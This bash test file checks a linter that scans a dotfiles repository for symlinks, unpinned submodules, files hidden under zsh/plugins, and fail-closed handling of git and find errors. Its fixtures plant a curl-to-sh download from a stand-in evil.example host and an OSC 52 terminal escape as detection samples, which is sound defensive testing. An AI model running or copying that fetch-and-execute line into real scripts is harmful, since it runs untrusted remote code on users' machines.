fails_with "$r" "$sym_git_msg" "a tracked symlink under a differently-cased path must still fail"

# --- an UNPINNED submodule (mode 160000, not in .gitmodules) is caught ------
r="$work/sym-rogue-submodule"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib/rogue-submodule
git -C "$r" commit -qm "add unpinned submodule"
fails_with "$r" "$sym_git_msg" "a submodule gitlink not pinned in .gitmodules must fail the gate"

# --- a PINNED submodule (mode 160000, matching .gitmodules) is NOT flagged --
r="$work/sym-pinned-submodule"; _git_repo "$r"; seed "$r"
cat > "$r/.gitmodules" <<'EOF'
[submodule "zsh/plugins/fake-plugin"]
	path = zsh/plugins/fake-plugin
	url = https://example.invalid/fake-plugin.git
EOF
mkdir -p "$r/zsh/plugins"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/fake-plugin
git -C "$r" commit -qm "add pinned submodule"
[ "$(run "$r")" = "0" ] && ok || fail "a submodule gitlink matching .gitmodules must not be flagged"

# --- an UNTRACKED symlink directly under zsh/plugins/ is flagged in a git
# checkout too: no arm reads there, and the direct-child find always runs ---
r="$work/sym-plugins-untracked"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/zsh/plugins/evil-link"
fails_only_with "$r" "$plugins_msg" "an untracked symlink directly under zsh/plugins/ must be flagged (git checkout)"

# --- REGRESSION: $root a subdirectory of a LARGER repo must not make the
# git pass scan the PARENT's whole tree - a tracked symlink outside $root
# (but inside the parent) must not surface, while one INSIDE $root (find's
# job, unconditional) still must ---------------------------------------------
parent="$work/sym-parent"; _git_repo "$parent"
mkdir -p "$parent/subproj/lib"; printf 'noop() { : ; }\n' > "$parent/subproj/lib/os.sh"
printf 'x\n' > "$parent/subproj/install.sh"
mkdir -p "$parent/elsewhere"
ln -s ../outside-target "$parent/elsewhere/evil-link"
printf 'x\n' > "$parent/outside-target"
git -C "$parent" add -A && git -C "$parent" commit -qm init
[ "$(run "$parent/subproj")" = "0" ] \
  && ok || fail "root as a subdir of a larger repo must not scan the parent's whole tree"
ln -s ./nonexistent-target "$parent/subproj/lib/evil-link"
fails_with "$parent/subproj" "$sym_msg" "a symlink INSIDE a subdir root must still be caught by find"

# --- STEERING: a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE at
# check-patterns' OWN invocation must not redirect its scan away from $root -
# sentinel is scratch, under /tmp, never a real checkout ---------------------
steer_sentinel="$work/steer-sentinel"; _git_repo "$steer_sentinel"
printf 'x\n' > "$steer_sentinel/f"; git -C "$steer_sentinel" add -A
git -C "$steer_sentinel" commit -qm sentinel
r="$work/sym-steer-target"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/lib/evil-link"
steer_rc=0
GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
  GIT_INDEX_FILE="/nonexistent/index" \
  STRICT= "$cp" "$r" >/dev/null 2>&1 || steer_rc=$?
[ "$steer_rc" != "0" ] \
  && ok || fail "a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE must not steer check-patterns away from a real violation in \$root"

# --- FAIL CLOSED: an unreadable dir in the surface fails the find pass.
# `chmod 000` is bypassed by root (DAC_OVERRIDE) - see the general fail-closed
# case above for what was tried instead. Every grep arm walks the same dir and
# errors too, so this proves find's own report, not that its bad=1 stands
# alone: the find-shim case below isolates that. ------------------------------
if [ "$(id -u)" -ne 0 ]; then
  r="$work/sym-find-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
  chmod 000 "$r/lib/locked"
  fails_with_rc 2 "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
  chmod u+rwx "$r/lib/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 12's find-branch fail-closed case"
fi

# --- FAIL CLOSED, isolated: a `find` that exits non-zero on PATH. find is
# arm 12's alone (no grep arm runs it), so fails_only_with proves the non-zero
# exit is arm 12's own bad=1. No zsh/plugins in the fixture, so the no-.git
# zsh/plugins pass (also find) does not run. Runs as root too. -------------
find_shim="$work/find-shim"; mkdir -p "$find_shim"
printf '#!/bin/sh
echo "find: simulated read error" >&2
exit 1
' > "$find_shim/find"
chmod u+x "$find_shim/find"
# A FRESH shell: the shim must be the find a new process resolves.
[ "$(PATH="$find_shim:$PATH" bash -c 'command -v find')" = "$find_shim/find" ] \
  || fail "the find shim is not the find a fresh process resolves"
# Arm 12's file-name passes, the NUL-byte pass and arm 15 run find too, so each
# reports its own error; no other message may fire. A scan error exits 2
# (fail closed), never 1, which reads as "a violation was found".
r="$work/sym-find-shim"; seed "$r"
find_rc=0
out="$(PATH="$find_shim:$PATH" STRICT= "$cp" "$r" 2>&1)" || find_rc=$?
[ "$find_rc" = "2" ] && ok || fail "a failing find must exit 2 (a scan error), got $find_rc: $out"
n_name_err=0; n_nul_err=0; n_md_err=0
while IFS= read -r line; do
  case "$line" in
    "$sym_find_err_msg"* | "check-patterns: SKIP "*) ;;
    "check-patterns: file-name scan (find) errored"*) n_name_err=$((n_name_err + 1)) ;;
    "check-patterns: NUL-byte scan (find) errored"*) n_nul_err=$((n_nul_err + 1)) ;;
    "check-patterns: Markdown line-width scan errored"*) n_md_err=$((n_md_err + 1)) ;;
    check-patterns:*) fail "a failing find: another message fired too: $line" ;;
  esac
done <<<"$out"
case "$out" in
  *"$sym_find_err_msg"*) ok ;;
  *) fail "a find that exits non-zero must fail closed the symlink scan, got: $out" ;;
esac
[ "$n_name_err" -eq 2 ] && ok \
  || fail "a find that exits non-zero must fail closed both file-name passes (got $n_name_err): $out"
[ "$n_nul_err" -eq 1 ] && ok \
  || fail "a find that exits non-zero must fail closed the NUL-byte pass (got $n_nul_err): $out"
[ "$n_md_err" -eq 1 ] && ok \
  || fail "a find that exits non-zero must fail closed arm 15's Markdown pass (got $n_md_err): $out"
# ... and EACH find pass alone: a shim that fails only the call holding one
# argument pair, so no other pass's exit 2 can stand in for this one's. Its
# error names a path with OSC 52 in it, and that name must print ESCAPED on
# the line right before the failing pass's own message: find's stderr of
# that one call, through the sanitizer. An unreadable directory cannot prove
# it, since the grep arms report the same directory through their own `2>&1`
# (a mutant sending the stderr of both scratch-file find calls, the NUL pass
# and _name_pass, to /dev/null survived every case that asserted the name
# anywhere in the run's stderr).
find_one="$work/find-one-shim"; mkdir -p "$find_one"
{
  cat <<'SHIM'
#!/bin/sh
prev=""
for a in "$@"; do
  if [ "$prev $a" = "$FIND_FAIL_ON" ]; then
    printf 'find: fo\033]52;c;aGk=\007: simulated read error\n' >&2
    exit 1
  fi
  prev="$a"
done
SHIM
  printf 'exec "%s" "$@"\n' "$(command -v find)"
} > "$find_one/find"
chmod u+x "$find_one/find"
find_one_x='find: fo\x1b]52;c;aGk=\x07: simulated read error'
# zsh/plugins, empty: the no-.git zsh/plugins pass runs its own find too
r="$work/find-one"; seed "$r"; mkdir -p "$r/zsh/plugins"
fo_n=0
for fo in '-type l|check-patterns: symlink scan (find) errored' \
    '-type f|check-patterns: NUL-byte scan (find) errored' \
    '-name *:*|check-patterns: file-name scan (find) errored' \
    '-name check-patterns|check-patterns: file-name scan (find) errored' \
    '-maxdepth 1|check-patterns: zsh/plugins scan (find) errored' \
    '-name *.md|check-patterns: Markdown line-width scan errored'; do
  fo_n=$((fo_n + 1))
  fo_rc=0
  out="$(PATH="$find_one:$PATH" FIND_FAIL_ON="${fo%%|*}" STRICT= "$cp" "$r" 2>&1)" || fo_rc=$?
  [ "$fo_rc" = "2" ] && ok || fail "a failing find ('${fo%%|*}' pass alone) must exit 2, got $fo_rc: $out"
  case "$out" in
    *$'\033'* | *$'\007'*) fail "a failing find ('${fo%%|*}' pass alone): a raw control byte reached the output: $out" ;;
  esac
  case "$out" in
    *"$find_one_x"$'\n'"${fo#*|}"*) ok ;;
    *) fail "a failing find ('${fo%%|*}' pass alone): expected its escaped error line right before '${fo#*|}', got: $out" ;;
  esac
done
[ "$fo_n" -eq 6 ] || fail "the per-find cases: expected 6 passes, ran $fo_n"

# --- FAIL CLOSED: a corrupted git index fails the repo-wide git pass, not a
# silent pass ("no symlinks") -------------------------------------------------
r="$work/sym-git-failclosed"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
printf 'garbage, not a git index\n' > "$r/.git/index"
fails_with_rc 2 "$r" "$sym_git_err_msg" "a corrupted git index must fail closed, not silently pass"

# --- a malformed .git at $root fails CLOSED, never a silent skip of the git
# pass: a corrupt HEAD makes the toplevel probe error, and a tracked symlink
# outside `prose` (find cannot see it) must not ride through -----------------
r="$work/sym-probe-corrupt-head"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
printf 'garbage, not a ref\n' > "$r/.git/HEAD"
fails_with_rc 2 "$r" "$sym_probe_msg" "a .git whose toplevel probe errors must fail closed, not skip the git pass"

# --- a .git at $root whose core.worktree points elsewhere resolves a
# different toplevel: fail closed, never scan the other tree -----------------
r="$work/sym-probe-worktree"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/outside-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
mkdir -p "$work/sym-probe-worktree-elsewhere"
git -C "$r" config core.worktree "$work/sym-probe-worktree-elsewhere"
fails_with_rc 2 "$r" "$sym_top_msg" "a .git whose core.worktree points away from \$root must fail closed" only

# --- a .git at $root with git absent from PATH fails CLOSED -----------------
# PATH is an explicit allowlist: every external tool bin/check-patterns runs
# on any path (bash for its shebang via env), resolved from the real PATH, and
# never git. It is a superset of what the no-git path needs, so a tool only
# the git pass would run (mktemp, rm) sits here too. A tool check-patterns
# needs that is missing here makes it print "command not found", failed below.
nogit_bin="$work/nogit-bin"; mkdir -p "$nogit_bin"
for t in bash env grep sed find mktemp cat sort rm tr; do
  # type -P: a PATH file only, never a builtin, function or alias of that name.
  t_path="$(type -P "$t" || true)"
  [ -n "$t_path" ] || fail "the git-less PATH fixture needs '$t', which is not on PATH"
  ln -s "$t_path" "$nogit_bin/$t"
done
# A FRESH shell: in-process, `PATH=x command -v git` can be answered from
# this shell's hash of the git it already ran (seen on macOS's bash 3.2).
if nogit_git="$(PATH="$nogit_bin" "$nogit_bin/bash" -c 'command -v git')"; then
  {
    echo "  git-less PATH: $nogit_bin -> git resolves as '$nogit_git'"
    PATH="$nogit_bin" "$nogit_bin/bash" -c 'type -a git' 2>&1 || true
    ls -la "$nogit_bin" || true
  } >&2
  fail "the git-less PATH fixture still resolves git"
fi
r="$work/sym-nogit"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
nogit_out="$(PATH="$nogit_bin" STRICT= "$cp" "$r" 2>&1)" || true
case "$nogit_out" in
  *"command not found"*) fail "the git-less PATH fixture lacks a tool bin/check-patterns runs: $nogit_out" ;;
esac
PATH="$nogit_bin" fails_with_rc 2 "$r" "$sym_nogit_msg" "a .git at root with git absent from PATH must fail closed" only

# --- GIT_TRACE / GIT_TRACE2 on stderr (not local env vars, so not stripped)
# must not corrupt the first NUL record: a first-sorting tracked symlink
# outside `prose` ('!a-link' sorts before every letter and '.') -------------
r="$work/sym-git-trace"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/!a-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
for tv in GIT_TRACE GIT_TRACE2; do
  trace_rc=0
  trace_out="$(env "$tv=1" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
  [ "$trace_rc" = "2" ] || fail "$tv=1 must fail closed (exit 2), got $trace_rc: $trace_out"
  case "$trace_out" in
    *"$sym_git_stderr_msg"*) ok ;;
    *) fail "$tv=1: expected '$sym_git_stderr_msg', got: $trace_out" ;;
  esac
done
# the same trace aimed at stdout lands in the probe's and the listing's
# output: whichever branch sees it first must fail closed
for tv in GIT_TRACE GIT_TRACE2; do
  trace_rc=0
  trace_out="$(env "$tv=/dev/stdout" STRICT= "$cp" "$r" 2>&1)" || trace_rc=$?
  [ "$trace_rc" = "2" ] || fail "$tv=/dev/stdout must fail closed (exit 2), got $trace_rc: $trace_out"
  case "$trace_out" in
    *"- failing closed"*) ok ;;
    *) fail "$tv=/dev/stdout: expected a fail-closed message, got: $trace_out" ;;
  esac
done
# a listing record that is not '<mode> <oid> <stage><TAB><path>' fails closed
# rather than being skipped: a git wrapper on PATH corrupts ONLY the ls-files
# output (the probe stays clean), prepended to the first record or appended
# as an unterminated last one
real_git="$(command -v git)"
for how in prepend append; do
  shim="$work/git-shim-$how"; mkdir -p "$shim"
  {
    printf '#!/bin/sh\n'
    printf 'case " $* " in *" ls-files "*) ;; *) exec "%s" "$@" ;; esac\n' "$real_git"
    [ "$how" = prepend ] && printf "printf 'noise'\n"
    printf '"%s" "$@" || exit $?\n' "$real_git"
    [ "$how" = append ] && printf "printf 'noise'\n"
    printf 'exit 0\n'
  } > "$shim/git"
  chmod u+x "$shim/git"
  rec_rc=0
  rec_out="$(PATH="$shim:$PATH" STRICT= "$cp" "$r" 2>&1)" || rec_rc=$?
  [ "$rec_rc" = "2" ] || fail "a malformed ($how) listing record must fail closed (exit 2), got $rec_rc: $rec_out"
  case "$rec_out" in
    *"$sym_git_record_msg"*) ok ;;
    *) fail "a malformed ($how) listing record: expected '$sym_git_record_msg', got: $rec_out" ;;
  esac
done

# --- the git pass ALONE, under a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE:
# the tracked symlink is gone from disk (find is clean), so only the git pass
# can see it, and only if it scans $root rather than the sentinel ------------
r="$work/sym-git-only-steer"; _git_repo "$r"; seed "$r"
ln -s ./target "$r/lib/evil-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm init
rm "$r/lib/evil-link"
GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
  GIT_INDEX_FILE="$steer_sentinel/.git/index" \
  fails_only_with "$r" "$sym_git_msg" "a tracked symlink absent from disk must fail via the git pass under a leaked GIT_DIR"

# --- an existing, non-empty .gitmodules does not pin EVERY gitlink ----------
r="$work/sym-rogue-beside-pinned"; _git_repo "$r"; seed "$r"
cat > "$r/.gitmodules" <<'GM'
[submodule "zsh/plugins/fake-plugin"]
	path = zsh/plugins/fake-plugin
	url = https://example.invalid/fake-plugin.git
GM
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/fake-plugin
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib/rogue
git -C "$r" commit -qm "pinned plus rogue"
fails_only_with "$r" "$sym_git_msg" "a rogue gitlink beside a pinned one must fail"

# --- only submodule.<name>.path pins, and only a direct child of zsh/plugins/
i=0
for gm in 'evil|lib/evil|[evil]' \
    'evil|zsh/plugins/evil|[evil]' \
    'submodule|zsh/plugins/bare|[submodule]' \
    'submodule "lib/x"|lib/x|[submodule "lib/x"]' \
    'submodule "zsh/plugins/a/b"|zsh/plugins/a/b|[submodule "zsh/plugins/a/b"]' \
    'submodule "zsh/plugins"|zsh/plugins|[submodule "zsh/plugins"]'; do
  i=$((i + 1))
  gm_rest="${gm#*|}"; gm_path="${gm_rest%%|*}"; gm_head="${gm_rest#*|}"
  r="$work/sym-gitmodules-$i"; _git_repo "$r"; seed "$r"
  printf '%s\n\tpath = %s\n\turl = https://example.invalid/x.git\n' \
    "$gm_head" "$gm_path" > "$r/.gitmodules"
  git -C "$r" add -A && git -C "$r" commit -qm init
  git -C "$r" update-index --add --cacheinfo \
    "160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,$gm_path"
  git -C "$r" commit -qm "gitlink $gm_path"
  fails_only_with "$r" "$sym_git_msg" "gitlink '$gm_path' declared as '$gm_head' must not count as a pinned plugin"
done

# --- zsh/plugins ITSELF a symlink is reported, not pruned (no .git: find) --
r="$work/sym-plugins-is-link"; seed "$r"; mkdir -p "$r/zsh" "$r/elsewhere"
ln -s ../elsewhere "$r/zsh/plugins"
fails_only_with "$r" "$sym_msg" "zsh/plugins itself a symlink must be reported, not pruned"

# --- zsh ITSELF a symlink is reported too: _scan_roots expands only a real
# zsh directory, never through a link (no .git: find) ----------------------
r="$work/sym-zsh-is-link"; seed "$r"; mkdir -p "$r/elsewhere/plugins"
ln -s ./elsewhere "$r/zsh"
fails_only_with "$r" "$sym_msg" "zsh itself a symlink must be reported, not expanded through"

# --- zsh/ that is not both readable and searchable stays ONE root, so grep
# and find error on it: expanding it would glob to nothing and pass ---------
if [ "$(id -u)" -ne 0 ]; then
  for zmode in 000 100 400; do
    r="$work/zsh-mode-$zmode"; seed "$r"; mkdir -p "$r/zsh"
    printf 'uname -m\n' > "$r/zsh/arch.zsh"
    chmod "$zmode" "$r/zsh"
    fails_with_rc 2 "$r" "check-patterns: curl|sh scan errored" "a zsh/ at mode $zmode must fail closed"
    chmod u+rwx "$r/zsh"
  done
else
  echo "  SKIP: running as root - cannot exercise the unreadable zsh/ fail-closed cases"
fi

# --- zsh/'s dot entries are scanned: `*` skips them, `.[!.]*` and `..?*`
# add them back; a dot-entry symlink is reported --------------------------
for dotf in .x.zsh ..x.zsh; do
  r="$work/zsh-dot-$dotf"; seed "$r"; mkdir -p "$r/zsh"
  printf 'uname -m\n' > "$r/zsh/$dotf"
  fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "zsh/$dotf must be scanned"
done
r="$work/zsh-dot-link"; seed "$r"; mkdir -p "$r/zsh"
ln -s ./nonexistent-target "$r/zsh/.evil-link"
fails_only_with "$r" "$sym_msg" "a dot-entry symlink in zsh/ must be reported"

# --- a symlink entry of zsh/ goes to arm 12 alone, never to a grep arm as an
# operand (GNU grep -r follows an operand symlink, BSD grep does not): into
# the pinned plugins, out of the surface, or dangling, only arm 12 reports --
r="$work/zsh-link-into-plugins"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf 'uname -m\n' > "$r/zsh/plugins/p/p.zsh"
ln -s ./plugins "$r/zsh/pl"
fails_only_with "$r" "$sym_msg" "zsh/pl -> plugins must not pull pinned code into the grep arms"
r="$work/zsh-link-outside"; seed "$r"; mkdir -p "$r/zsh" "$r/outside"
printf 'uname -m\n' > "$r/outside/o.zsh"
ln -s ../outside "$r/zsh/out"
fails_only_with "$r" "$sym_msg" "zsh/out -> ../outside must not be scanned by the grep arms"
r="$work/zsh-link-dangling"; seed "$r"; mkdir -p "$r/zsh"
ln -s ./nonexistent-target "$r/zsh/dang"
fails_only_with "$r" "$sym_msg" "a dangling zsh/ entry must be reported by arm 12 alone, not error the grep arms"

# --- a regular FILE named zsh/plugins is not the pinned directory: scanned --
r="$work/zsh-plugins-file"; seed "$r"; mkdir -p "$r/zsh"
printf 'uname -m\n' > "$r/zsh/plugins"
fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a plain file named zsh/plugins must be scanned"

# --- an inherited BASHOPTS must not change the globbing: failglob aborted
# on an unmatched dot glob (rc 1, read as a violation), dotglob reported each
# zsh/ dot-entry hit twice. bash imports BASHOPTS from 4.1 on only, so a
# bash without it skips here, visibly ----------------------------------------
cp_bash="$(env bash -c 'printf %s "$BASH"')"
if [ "$(env BASHOPTS=failglob "$cp_bash" -c 'shopt -q failglob && echo y' 2>/dev/null || true)" = y ]; then
  r="$work/bashopts-failglob"; seed "$r"; mkdir -p "$r/zsh"
  printf 'noop() { : ; }\n' > "$r/zsh/a.zsh"
  bo_rc=0; env BASHOPTS=failglob STRICT= "$cp" "$r" >/dev/null 2>&1 || bo_rc=$?
  [ "$bo_rc" = "0" ] && ok || fail "an inherited BASHOPTS=failglob must not fail a clean tree (rc $bo_rc)"
  r="$work/bashopts-dotglob"; seed "$r"; mkdir -p "$r/zsh"
  printf 'uname -m\n' > "$r/zsh/.x.zsh"
  bo_out="$(env BASHOPTS=dotglob STRICT= "$cp" "$r" 2>&1)" || true
  bo_n="$(printf '%s\n' "$bo_out" | grep -c '/zsh/\.x\.zsh:' || true)"
  [ "$bo_n" = "1" ] && ok || fail "an inherited BASHOPTS=dotglob must not duplicate a hit ($bo_n): $bo_out"
else
  echo "  SKIP: $cp_bash does not import BASHOPTS - the inherited-shopt cases need bash 4.1+"
fi

# --- the exclusion is the ONE exact zsh/plugins path: a `plugins` dir
# anywhere else is still walked (no .git: find alone) ------------------------
for pdir in lib/plugins docs/plugins zsh/sub/plugins; do
  r="$work/sym-other-plugins-$(printf '%s' "$pdir" | tr '/' '-')"; seed "$r"
  mkdir -p "$r/$pdir"; ln -s ./nonexistent-target "$r/$pdir/evil-link"
  fails_only_with "$r" "$sym_msg" "a symlink under $pdir (not the pinned zsh/plugins) must be caught"
done

# --- a glob character in $root must not break the literal zsh/plugins
# exclusion (_scan_roots globs "$root"/zsh/*, with $root quoted): a symlink
# inside a pinned plugin dir stays unwalked, and zsh/ itself is still read --
r="$work/glob[x]"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
ln -s ./nonexistent-target "$r/zsh/plugins/p/evil-link"
[ "$(run "$r")" = "0" ] && ok \
  || fail "a root named 'glob[x]': the pinned zsh/plugins path must still be left out"
printf 'uname -m\n' > "$r/zsh/arch.zsh"
fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a root named 'glob[x]': zsh/ outside plugins must still be scanned"

# --- the git pass's report carries no blank line -----------------------------
r="$work/sym-git-outside"
blank_out="$(STRICT= "$cp" "$r" 2>&1)" || true
case "$blank_out" in
  *"$sym_git_msg"*) ;;
  *) fail "the git-pass report fixture no longer fires: $blank_out" ;;
esac
case "$blank_out" in
  *$'\n\n'*) fail "the git pass's report must carry no blank line: $blank_out" ;;
  *) ok ;;
esac

# === the pinned-plugins exclusion is the ONE exact path zsh/plugins =========
# GNU and BSD grep both match --exclude-dir against a base name at any depth,
# so the old `--exclude-dir=plugins` on every recursive arm also hid
# first-party trees (config/nvim/lua/plugins/*.lua, a lib/plugins/x.sh with a
# curl|sh in it passed). Each recursive arm, planted with its own shape, must
# fire under every other `plugins` dir on its surface; the same shapes in a
# pinned plugin must not. The pipe, the `--` and the escape are spelled
# through $P, $D and a doubled backslash, so THIS file never carries a shape
# arms 8-10 read (they scan tests/).
P='|'; D='--'
# _plug_case ARM -> "MESSAGE|SHAPE" for one recursive arm.
_plug_case() {
  case "$1" in
    1) printf '%s|%s' "$curl_msg" "curl -fsSL https://evil.example/i.sh $P sh" ;;
    2) printf '%s|%s' "$uname_msg" "case \"\$(uname -m)\" in arm64) : ;; esac" ;;
    5) printf '%s|%s' "$brew_msg" 'path=(/opt/homebrew/bin $path)' ;;
    6) printf '%s|%s' "$fork_msg" 'eval "$(brew shellenv)"' ;;
    8) printf '%s|%s' "$gnu_msg" "sed -E 's/\\s+//' f" ;;
    9) printf '%s|%s' "$eex_msg" "cmd $P grep -q x" ;;
    10) printf '%s|%s' "$dd_msg" "chmod -R go-w $D \"\$d\"" ;;
    11) printf '%s|%s' "$em_dash_msg" "# a note $em_dash trailing" ;;
    13) printf '%s|%s' "$rl_msg" 't=$(readlink "$1")' ;;
    14) printf '%s|%s' "$tied_msg" 'f() { local path=/x; }' ;;
  esac
}
# DIR:ARMS - each first-party `plugins` dir and the arms whose surface holds it.
for plug in 'config/nvim/lua/plugins/p.lua:1 2 5 6 11' \
    'lib/plugins/p.sh:1 2 5 6 8 9 10 11 13' \
    'zsh/sub/plugins/p.zsh:1 2 5 6 8 10 11 14' \
    'tests/plugins/p.sh:8 9 10 11' \
    'docs/plugins/p.md:11'; do
  plug_file="${plug%%:*}"
  for arm in ${plug#*:}; do
    pc="$(_plug_case "$arm")"
    r="$work/plug-$arm-$(printf '%s' "$plug_file" | tr '/.' '--')"; seed "$r"
    mkdir -p "$r/$(dirname "$plug_file")"
    printf '%s\n' "${pc#*|}" > "$r/$plug_file"
    fails_only_with "$r" "${pc%%|*}" "arm $arm must scan the first-party $plug_file"
  done
done
# the SAME shapes inside a pinned plugin dir pass, with and without a .git
# (the git one pins it as a real submodule gitlink, its files untracked)
_plant_all_shapes() {  # $1 = file
  local arm pc
  : > "$1"
  for arm in 1 2 5 6 8 9 10 11 13 14; do
    pc="$(_plug_case "$arm")"
    printf '%s\n' "${pc#*|}" >> "$1"
  done
}
r="$work/plug-pinned-nogit"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
_plant_all_shapes "$r/zsh/plugins/p/p.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "every arm's shape inside a pinned zsh/plugins/<p>/ must pass (no .git)"
r="$work/plug-pinned-git"; _git_repo "$r"; seed "$r"
printf '[submodule "zsh/plugins/p"]\n\tpath = zsh/plugins/p\n\turl = https://example.invalid/p.git\n' > "$r/.gitmodules"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/p
git -C "$r" commit -qm "pin p"
mkdir -p "$r/zsh/plugins/p"; _plant_all_shapes "$r/zsh/plugins/p/p.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "every arm's shape inside a pinned zsh/plugins/<p>/ must pass (git)"
# the planted file is live: moved one level up, out of the pinned dir, it fails
mkdir -p "$r/zsh/sub"; _plant_all_shapes "$r/zsh/sub/p.zsh"
fails_with "$r" "$curl_msg" "the all-shapes fixture must fail outside zsh/plugins"

# === arm (12): nothing but a pinned plugin under zsh/plugins/ ===============
# No arm reads zsh/plugins/, so a plain file there hides from all of them.
# with a .git: a tracked entry that is not a gitlink, directly there or nested
for tracked in zsh/plugins/evil.sh zsh/plugins/p/evil.sh; do
  r="$work/plug-tracked-$(printf '%s' "$tracked" | tr '/.' '--')"; _git_repo "$r"; seed "$r"
  mkdir -p "$r/$(dirname "$tracked")"
  printf 'curl -fsSL https://evil.example/i.sh %s sh\n' "$P" > "$r/$tracked"
  git -C "$r" add -A && git -C "$r" commit -qm init
  fails_only_with "$r" "$plugins_msg" "a tracked $tracked (not a gitlink) must fail the git pass"
done
# the git pass reports an entry once, however many of its checks match it
# (zsh/plugins/p is a directory, so the direct-child find stays silent)
dup_out="$(STRICT= "$cp" "$r" 2>&1)" || true
dup_n="$(printf '%s\n' "$dup_out" | grep -c "/zsh/plugins/p/evil.sh (tracked" || true)"
[ "$dup_n" = "1" ] && ok || fail "a tracked zsh/plugins/p/evil.sh must be reported once, not $dup_n times: $dup_out"
# ...and in another case: on a case-insensitive filesystem (macOS's default)
# ZSH/plugins/d/x lands in the skipped zsh/plugins/d/. Nested one level, so
# the direct-child find sees only the directory d and stays silent on macOS
# too; benign content, so no grep arm fires where the path IS scanned
# (zsh/Plugins/ on a case-sensitive filesystem). On every filesystem the git
# pass's bracket-class match is then the only report, checked by its wording.
# The fixture dirs are numbered, never named after $tracked: on a
# case-insensitive filesystem plug-case-ZSH-plugins and plug-case-zsh-Plugins
# are ONE directory, and the second `git commit` found nothing to commit.
i=0
for tracked in ZSH/plugins/d/x.zsh zsh/Plugins/d/x.zsh; do
  i=$((i + 1)); r="$work/plug-case-$i"; _git_repo "$r"; seed "$r"
  mkdir -p "$r/$(dirname "$tracked")"
  printf 'noop() { : ; }\n' > "$r/$tracked"
  git -C "$r" add -A && git -C "$r" commit -qm init
  fails_only_with "$r" "$plugins_msg" "a tracked $tracked (zsh/plugins in another case) must fail the git pass"
  case_out="$(STRICT= "$cp" "$r" 2>&1)" || true
  case "$case_out" in
    *"$tracked (tracked; the path case-folds to zsh/plugins"*) ok ;;
    *) fail "a tracked $tracked must be reported by the git pass's case-fold match: $case_out" ;;
  esac
done
# ...and any other spelling of the first two segments the FILESYSTEM resolves
# to zsh/plugins (APFS folds non-ASCII too: zU+017Fh). Asked with -ef, so a
# symlink on disk stands in for the folding here, under names no bracket class
# matches: the index tracks zsh2/... and zsh/plugins2/... as plain files, while
# on disk zsh2 -> zsh and zsh/plugins2 -> plugins.
r="$work/plug-ef-dir"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh2/plugins/evil"
printf 'noop() { : ; }\n' > "$r/zsh2/plugins/evil/e.zsh"
git -C "$r" add -A && git -C "$r" commit -qm init
rm -rf "$r/zsh2"; mkdir -p "$r/zsh/plugins"; ln -s zsh "$r/zsh2"
fails_only_with "$r" "$plugins_msg" "a tracked zsh2/plugins/evil/e.zsh whose zsh2 is zsh on disk must fail"
ef_out="$(STRICT= "$cp" "$r" 2>&1)" || true
case "$ef_out" in
  *"on disk, 'zsh2/plugins' is the same directory as zsh/plugins)"*) ok ;;
  *) fail "the zsh2 fixture must be reported by the -ef test: $ef_out" ;;
esac
# NEGATIVE: a tracked zsh2/extra.zsh (zsh2 -> zsh on disk) lands at
# zsh/extra.zsh, which the grep arms scan: its shape is theirs to report,
# and it is no zsh/plugins entry
r="$work/plug-ef-outside-plugins"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh2"
printf 'uname -m\n' > "$r/zsh2/extra.zsh"
git -C "$r" add -A && git -C "$r" commit -qm init
rm -rf "$r/zsh2"; mkdir -p "$r/zsh/plugins"
printf 'uname -m\n' > "$r/zsh/extra.zsh"; ln -s zsh "$r/zsh2"
fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a tracked zsh2/extra.zsh landing in zsh/ must be the grep arm's, not a zsh/plugins entry"
